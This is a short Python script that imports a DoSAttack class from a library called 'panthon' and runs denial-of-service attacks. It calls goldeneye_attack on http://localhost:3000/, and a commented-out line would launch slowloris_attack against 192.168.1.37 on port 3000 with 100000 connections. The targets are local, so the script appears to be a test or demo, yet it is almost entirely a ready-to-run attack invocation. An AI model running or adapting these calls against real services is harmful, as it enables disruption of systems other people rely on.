from panthon import DoSAttack

dos = DoSAttack()
# dos.slowloris_attack(target="192.168.1.37", target_port=3000, num_connections=100000)
dos.goldeneye_attack(url="http://localhost:3000/")
